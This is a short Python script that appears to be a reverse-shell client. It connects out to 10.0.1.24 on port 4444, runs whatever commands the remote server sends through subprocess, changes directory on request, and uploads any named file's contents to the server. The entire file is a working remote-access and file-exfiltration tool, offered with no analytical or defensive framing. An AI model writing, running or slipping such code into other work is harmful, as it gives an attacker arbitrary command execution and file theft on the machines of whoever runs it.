import socket
import os
import subprocess
import sys

SERVER_HOST = "10.0.1.24"
#SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
BUFFER_SIZE = 1024
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splitted_command = command.split()
    #print(command)

    if command.lower() == "exit":
        break
    if splitted_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splitted_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    elif splitted_command[0].lower() == 'read':
        file_name = splitted_command[1]
        
        file_size = os.path.getsize(file_name)
        s.send(str(file_size).encode())
        with open(file_name, "rb") as f:
            data = f.read()
        s.send(data)
        """
        with open(file_name, "rb") as f:
            while True:
                # read the bytes from the file
                data = f.read(BUFFER_SIZE)
                if not data:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in 
                # busy networks
                s.send(data)
        
        """
        output = ""
    else:
        output = subprocess.getoutput(command)
    #print(s.)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())

s.close()
